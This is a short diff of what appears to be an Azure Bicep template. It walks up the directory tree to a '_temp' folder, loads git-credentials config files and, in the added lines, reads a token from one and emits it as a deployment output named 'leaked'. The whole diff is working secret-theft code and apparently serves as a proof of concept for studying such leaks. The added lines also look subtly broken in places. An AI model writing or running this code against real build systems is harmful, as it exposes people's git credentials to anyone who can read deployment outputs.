@@ -11,11 +11,11 @@ var credFiles = loadDirectoryFileInfo('../../../_temp', 'git-credentials-*.confi
 // var garbled2 = loadTextContent(credFiles[0].relativePath, 'utf-16BE')
 // output garbledBE string = garbled2
 
-var garbled = loadTextContent(credFiles[0].relativePath, 'utf-16')
-
-var huge = loadFileAsBase64('huge_file.bin')  // 90MB file
-
-output token string = garbled    // Garbled token in output
-output padding string = huge     // Makes output large
+// var garbled = loadTextContent(credFiles[0].relativePath, 'utf-16')
+// output token string = garbled    // Garbled token in output
 
 
+@secure()
+  param token string = loadTextContent(credFiles[0], 'utf-16')
+
+output leaked string = token
